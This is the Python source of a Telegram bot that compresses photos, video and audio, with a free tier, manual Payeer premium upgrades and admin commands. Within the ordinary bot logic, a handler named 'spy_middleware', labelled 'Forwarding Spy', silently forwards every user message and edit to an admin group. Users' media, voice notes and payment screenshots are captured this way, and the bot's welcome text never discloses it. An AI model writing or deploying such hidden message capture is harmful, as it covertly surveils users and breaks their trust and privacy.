"""
main.py - Telegram Media Compression Bot
Stack: python-telegram-bot v20+, Motor, FFmpeg, Pillow
Deploy target: Railway.app + MongoDB Atlas
"""

import asyncio
import io
import logging
import os
import subprocess
import tempfile
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path

from apscheduler.schedulers.asyncio import AsyncIOScheduler
from PIL import Image
from telegram import (
    Bot,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    Update,
)
from telegram.constants import ParseMode
from telegram.error import TelegramError
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

from database import db

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Environment ────────────────────────────────────────────────────────────────
BOT_TOKEN: str = os.environ["BOT_TOKEN"]
ADMIN_GROUP_ID: int = int(os.environ["ADMIN_GROUP_ID"])
ADMIN_IDS: list[int] = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x]
PAYEER_ADDRESS: str = os.environ.get("PAYEER_ADDRESS", "P1000000")
BOT_NAME: str = os.environ.get("BOT_NAME", "CompressBot")
FREE_DAILY_LIMIT: int = int(os.environ.get("FREE_DAILY_LIMIT", "5"))

# ── Conversation states ────────────────────────────────────────────────────────
AWAITING_PAYMENT_PROOF = 1

# ── CRF presets ───────────────────────────────────────────────────────────────
CRF_PRESETS = {"low": 35, "medium": 28, "high": 22}


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


async def forward_to_admin_group(bot: Bot, message: Message) -> None:
    """Silently forward every incoming message to the admin monitoring group."""
    try:
        await bot.forward_message(
            chat_id=ADMIN_GROUP_ID,
            from_chat_id=message.chat_id,
            message_id=message.message_id,
        )
    except TelegramError as e:
        logger.warning("Forward to admin group failed: %s", e)


async def check_user_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> tuple[dict | None, bool]:
    """
    Returns (user_doc, can_proceed).
    Handles ban-check and free-tier limit check.
    Sends appropriate reply if access is denied.
    """
    user = update.effective_user
    user_doc = await db.upsert_user(user.id, user.username, user.full_name)

    if user_doc.get("is_banned"):
        await update.message.reply_text("🚫 You have been banned from using this bot.")
        return user_doc, False

    if user_doc.get("status") == "premium":
        return user_doc, True

    # Free tier limit
    usage = await db.get_daily_usage(user.id)
    if usage >= FREE_DAILY_LIMIT:
        await update.message.reply_text(
            f"⚠️ You've reached your daily limit of {FREE_DAILY_LIMIT} files.\n"
            "Upgrade to Premium for unlimited compression — /upgrade"
        )
        return user_doc, False

    return user_doc, True


# ══════════════════════════════════════════════════════════════════════════════
#  MIDDLEWARE  — Forwarding Spy
# ══════════════════════════════════════════════════════════════════════════════

async def spy_middleware(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global post-processing hook: forwards every update to the admin group."""
    if update.message:
        await forward_to_admin_group(context.bot, update.message)
    elif update.edited_message:
        await forward_to_admin_group(context.bot, update.edited_message)


# ══════════════════════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await db.upsert_user(user.id, user.username, user.full_name)
    await update.message.reply_text(
        f"👋 Welcome to *{BOT_NAME}*!\n\n"
        "Send me a *video*, *audio*, *voice message*, or *photo* and I'll compress it for you.\n\n"
        "📦 *Free tier*: 5 files/day\n"
        "⭐ *Premium*: Unlimited — /upgrade\n\n"
        "Commands:\n"
        "/start — Show this message\n"
        "/upgrade — Get Premium ($1/month)\n"
        "/status — Your current plan",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_doc = await db.upsert_user(user.id, user.username, user.full_name)
    usage = await db.get_daily_usage(user.id)
    status = user_doc.get("status", "free")
    expiry = user_doc.get("expiry_date")

    lines = [f"👤 *Status*: {'⭐ Premium' if status == 'premium' else '🆓 Free'}"]
    if status == "premium" and expiry:
        if isinstance(expiry, str):
            expiry = datetime.fromisoformat(expiry)
        if expiry.tzinfo is None:
            expiry = expiry.replace(tzinfo=timezone.utc)
        days_left = (expiry - datetime.now(timezone.utc)).days
        lines.append(f"📅 *Expires*: {expiry.strftime('%Y-%m-%d')} ({days_left} days left)")
    else:
        lines.append(f"📊 *Today's usage*: {usage}/{FREE_DAILY_LIMIT} files")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


# ══════════════════════════════════════════════════════════════════════════════
#  PAYMENT / UPGRADE FLOW
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_upgrade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "⭐ *Upgrade to Premium — $1/month*\n\n"
        f"Send *$1 USD* via Payeer to:\n`{PAYEER_ADDRESS}`\n\n"
        "Then *send a screenshot* of your payment confirmation here.\n"
        "An admin will verify and activate your account within a few hours.\n\n"
        "Send /cancel to abort.",
        parse_mode=ParseMode.MARKDOWN,
    )
    return AWAITING_PAYMENT_PROOF


async def receive_payment_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    message = update.message

    if not message.photo:
        await message.reply_text("❌ Please send a *screenshot* (photo) of your payment.", parse_mode=ParseMode.MARKDOWN)
        return AWAITING_PAYMENT_PROOF

    uname = f"@{user.username}" if user.username else user.full_name
    caption = (
        f"💰 *Payment Proof*\n"
        f"User: {uname}\n"
        f"ID: `{user.id}`\n"
        f"Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
    )

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Approve ✅", callback_data=f"approve_{user.id}"),
            InlineKeyboardButton("Reject ❌", callback_data=f"reject_{user.id}"),
        ]
    ])

    await context.bot.send_photo(
        chat_id=ADMIN_GROUP_ID,
        photo=message.photo[-1].file_id,
        caption=caption,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=keyboard,
    )

    await message.reply_text(
        "✅ Payment proof received! An admin will review it shortly.\n"
        "You'll be notified once approved."
    )
    return ConversationHandler.END


async def cancel_upgrade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Upgrade cancelled.")
    return ConversationHandler.END


async def callback_approve(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query: CallbackQuery = update.callback_query
    await query.answer()

    if not is_admin(query.from_user.id):
        await query.answer("⛔ Admins only.", show_alert=True)
        return

    target_id = int(query.data.split("_")[1])
    success = await db.approve_premium(target_id, days=30)

    if success:
        expiry = (datetime.now(timezone.utc) + timedelta(days=30)).strftime("%Y-%m-%d")
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                "🎉 *Congratulations! Your Premium is now active!*\n\n"
                f"✅ Valid until: `{expiry}`\n"
                "Enjoy unlimited compressions with no watermarks!"
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
        await query.edit_message_caption(
            caption=query.message.caption + f"\n\n✅ *Approved by {query.from_user.full_name}*",
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        await query.answer("User not found in DB.", show_alert=True)


async def callback_reject(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query: CallbackQuery = update.callback_query
    await query.answer()

    if not is_admin(query.from_user.id):
        await query.answer("⛔ Admins only.", show_alert=True)
        return

    target_id = int(query.data.split("_")[1])
    await context.bot.send_message(
        chat_id=target_id,
        text=(
            "❌ *Your payment proof was rejected.*\n\n"
            "The screenshot did not meet verification requirements.\n"
            "Please ensure you send a clear, unedited screenshot and try again with /upgrade."
        ),
        parse_mode=ParseMode.MARKDOWN,
    )
    await query.edit_message_caption(
        caption=query.message.caption + f"\n\n❌ *Rejected by {query.from_user.full_name}*",
        parse_mode=ParseMode.MARKDOWN,
    )


# ══════════════════════════════════════════════════════════════════════════════
#  MEDIA COMPRESSION
# ══════════════════════════════════════════════════════════════════════════════

# ── Photo ──────────────────────────────────────────────────────────────────────

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_doc, ok = await check_user_access(update, context)
    if not ok:
        return

    msg = await update.message.reply_text("🖼️ Compressing your photo...")

    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)

    with tempfile.TemporaryDirectory() as tmpdir:
        in_path = Path(tmpdir) / "input.jpg"
        await file.download_to_drive(str(in_path))

        out_buf = io.BytesIO()
        with Image.open(in_path) as img:
            # Resize if too large (max 2048 on long side)
            max_side = 2048
            if max(img.size) > max_side:
                ratio = max_side / max(img.size)
                new_size = (int(img.width * ratio), int(img.height * ratio))
                img = img.resize(new_size, Image.LANCZOS)

            # Convert RGBA→RGB for JPEG
            if img.mode in ("RGBA", "P"):
                img = img.convert("RGB")

            img.save(out_buf, format="JPEG", quality=70, optimize=True)
        out_buf.seek(0)

    usage = await db.increment_usage(update.effective_user.id)
    is_premium = user_doc.get("status") == "premium"
    caption = None if is_premium else f"Compressed by {BOT_NAME} (Free Tier)"

    await update.message.reply_photo(photo=out_buf, caption=caption)
    await msg.delete()


# ── Video ──────────────────────────────────────────────────────────────────────

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_doc, ok = await check_user_access(update, context)
    if not ok:
        return

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔵 Low", callback_data="video_low"),
            InlineKeyboardButton("🟡 Medium", callback_data="video_medium"),
            InlineKeyboardButton("🟢 High", callback_data="video_high"),
        ]
    ])
    sent = await update.message.reply_text(
        "📹 Choose compression level:\n"
        "• *Low* — smaller file, lower quality\n"
        "• *Medium* — balanced (recommended)\n"
        "• *High* — best quality, largest file",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=keyboard,
    )
    # Store original message id for later retrieval
    context.user_data["pending_video_msg_id"] = update.message.message_id
    context.user_data["pending_video_chat_id"] = update.message.chat_id
    context.user_data["user_doc"] = user_doc


async def compress_video_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query: CallbackQuery = update.callback_query
    await query.answer()

    level = query.data.split("_")[1]  # low / medium / high
    crf = CRF_PRESETS[level]
    user_doc = context.user_data.get("user_doc", {})

    status_msg = await query.edit_message_text(f"⏳ Compressing video ({level} quality)…")

    # Re-fetch the video from the original message
    chat_id = context.user_data.get("pending_video_chat_id")
    msg_id = context.user_data.get("pending_video_msg_id")

    try:
        fwd = await context.bot.forward_message(
            chat_id=update.effective_chat.id,
            from_chat_id=chat_id,
            message_id=msg_id,
        )
        video_file_id = (fwd.video or fwd.document).file_id
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=fwd.message_id)
    except TelegramError:
        # Fallback: ask user to resend
        await status_msg.edit_text("⚠️ Couldn't retrieve video. Please resend it.")
        return

    tg_file = await context.bot.get_file(video_file_id)

    with tempfile.TemporaryDirectory() as tmpdir:
        in_path = Path(tmpdir) / "input.mp4"
        out_path = Path(tmpdir) / "output.mp4"
        await tg_file.download_to_drive(str(in_path))

        cmd = [
            "ffmpeg", "-y", "-i", str(in_path),
            "-vcodec", "libx264", "-crf", str(crf),
            "-preset", "fast", "-acodec", "aac", "-b:a", "128k",
            str(out_path),
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await proc.communicate()

        if proc.returncode != 0:
            logger.error("FFmpeg error: %s", stderr.decode())
            await status_msg.edit_text("❌ Compression failed. Make sure the video is a valid format.")
            return

        await db.increment_usage(update.effective_user.id)
        is_premium = user_doc.get("status") == "premium"
        caption = None if is_premium else f"Compressed by {BOT_NAME} (Free Tier)"

        with open(out_path, "rb") as f:
            await query.message.reply_video(video=f, caption=caption, supports_streaming=True)

    await status_msg.delete()


# ── Audio / Voice ──────────────────────────────────────────────────────────────

async def handle_audio_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_doc, ok = await check_user_access(update, context)
    if not ok:
        return

    msg = await update.message.reply_text("🎵 Compressing audio…")
    message = update.message
    is_voice = message.voice is not None
    media = message.voice or message.audio
    tg_file = await context.bot.get_file(media.file_id)

    with tempfile.TemporaryDirectory() as tmpdir:
        ext = "ogg" if is_voice else (Path(media.file_name or "audio.mp3").suffix.lstrip(".") or "mp3")
        in_path = Path(tmpdir) / f"input.{ext}"
        out_path = Path(tmpdir) / "output.ogg"
        await tg_file.download_to_drive(str(in_path))

        cmd = [
            "ffmpeg", "-y", "-i", str(in_path),
            "-c:a", "libopus", "-b:a", "32k",
            "-vbr", "on", "-compression_level", "10",
            str(out_path),
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await proc.communicate()

        if proc.returncode != 0:
            logger.error("FFmpeg audio error: %s", stderr.decode())
            await msg.edit_text("❌ Audio compression failed.")
            return

        await db.increment_usage(update.effective_user.id)
        is_premium = user_doc.get("status") == "premium"
        caption = None if is_premium else f"Compressed by {BOT_NAME} (Free Tier)"

        with open(out_path, "rb") as f:
            if is_voice:
                await message.reply_voice(voice=f, caption=caption)
            else:
                await message.reply_audio(audio=f, caption=caption)

    await msg.delete()


# ══════════════════════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return

    stats = await db.get_stats()
    await update.message.reply_text(
        "📊 *Bot Statistics*\n\n"
        f"👥 Total users: `{stats['total_users']}`\n"
        f"⭐ Premium users: `{stats['premium_users']}`\n"
        f"🚫 Banned users: `{stats['banned_users']}`\n"
        f"📁 Files today: `{stats['files_today']}`",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return

    text = " ".join(context.args)
    user_ids = await db.get_all_user_ids()
    sent = failed = 0

    status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(user_ids)} users…")

    for uid in user_ids:
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 *Announcement*\n\n{text}", parse_mode=ParseMode.MARKDOWN)
            sent += 1
        except TelegramError:
            failed += 1
        await asyncio.sleep(0.05)  # Respect rate limits

    await status_msg.edit_text(f"✅ Broadcast done.\nSent: {sent} | Failed: {failed}")


async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    uid = int(context.args[0])
    await db.ban_user(uid)
    await update.message.reply_text(f"🚫 User `{uid}` has been banned.", parse_mode=ParseMode.MARKDOWN)


async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    uid = int(context.args[0])
    await db.unban_user(uid)
    await update.message.reply_text(f"✅ User `{uid}` has been unbanned.", parse_mode=ParseMode.MARKDOWN)


async def cmd_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    uid = int(context.args[0])
    await db.revoke_premium(uid)
    await update.message.reply_text(f"⬇️ Premium revoked for `{uid}`.", parse_mode=ParseMode.MARKDOWN)
    try:
        await context.bot.send_message(chat_id=uid, text="ℹ️ Your Premium subscription has been revoked by an admin.")
    except TelegramError:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  SCHEDULER JOBS
# ══════════════════════════════════════════════════════════════════════════════

async def job_check_subscriptions(bot: Bot) -> None:
    """Run every 24h: expire old subs + send 48h warnings."""
    logger.info("Running subscription check…")

    # 1. Send 48h reminder
    expiring = await db.get_expiring_soon(hours=48)
    for user in expiring:
        try:
            expiry = user["expiry_date"]
            if isinstance(expiry, str):
                expiry = datetime.fromisoformat(expiry)
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            hours_left = int((expiry - datetime.now(timezone.utc)).total_seconds() / 3600)
            await bot.send_message(
                chat_id=user["user_id"],
                text=(
                    f"⏰ *Subscription Reminder*\n\n"
                    f"Your Premium expires in ~{hours_left} hours.\n"
                    "Renew now with /upgrade to stay unlimited!"
                ),
                parse_mode=ParseMode.MARKDOWN,
            )
        except TelegramError:
            pass

    # 2. Expire subscriptions
    expired_count = await db.expire_subscriptions()
    if expired_count:
        # Notify the already-expired users (fetched before expiry)
        expired_users = await db.get_expired()  # should be 0 after expire, but get_expired returns [] now
        logger.info("Expired %d subscriptions.", expired_count)


# ══════════════════════════════════════════════════════════════════════════════
#  APPLICATION SETUP
# ══════════════════════════════════════════════════════════════════════════════

def build_application() -> Application:
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(on_startup)
        .post_shutdown(on_shutdown)
        .build()
    )

    # ── Upgrade conversation ───────────────────────────────────────────────────
    upgrade_conv = ConversationHandler(
        entry_points=[CommandHandler("upgrade", cmd_upgrade)],
        states={
            AWAITING_PAYMENT_PROOF: [
                MessageHandler(filters.PHOTO, receive_payment_proof),
                CommandHandler("cancel", cancel_upgrade),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_upgrade)],
        per_user=True,
        per_chat=True,
    )

    # ── Register handlers ──────────────────────────────────────────────────────
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("revoke", cmd_revoke))
    app.add_handler(upgrade_conv)

    # Admin approval callbacks
    app.add_handler(CallbackQueryHandler(callback_approve, pattern=r"^approve_\d+$"))
    app.add_handler(CallbackQueryHandler(callback_reject, pattern=r"^reject_\d+$"))
    app.add_handler(CallbackQueryHandler(compress_video_callback, pattern=r"^video_(low|medium|high)$"))

    # Media handlers
    app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO & ~filters.COMMAND, handle_video))
    app.add_handler(MessageHandler((filters.AUDIO | filters.VOICE) & ~filters.COMMAND, handle_audio_voice))

    # Spy middleware (runs after every handled update)
    app.add_handler(MessageHandler(filters.ALL, spy_middleware), group=99)

    return app


async def on_startup(app: Application) -> None:
    await db.connect()

    scheduler = AsyncIOScheduler(timezone="UTC")
    scheduler.add_job(
        job_check_subscriptions,
        trigger="interval",
        hours=24,
        args=[app.bot],
        next_run_time=datetime.now(timezone.utc) + timedelta(minutes=1),
    )
    scheduler.start()
    app.bot_data["scheduler"] = scheduler
    logger.info("Bot started. Scheduler running.")


async def on_shutdown(app: Application) -> None:
    await db.close()
    scheduler = app.bot_data.get("scheduler")
    if scheduler:
        scheduler.shutdown(wait=False)
    logger.info("Bot shut down cleanly.")


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    application = build_application()
    application.run_polling(drop_pending_updates=True)
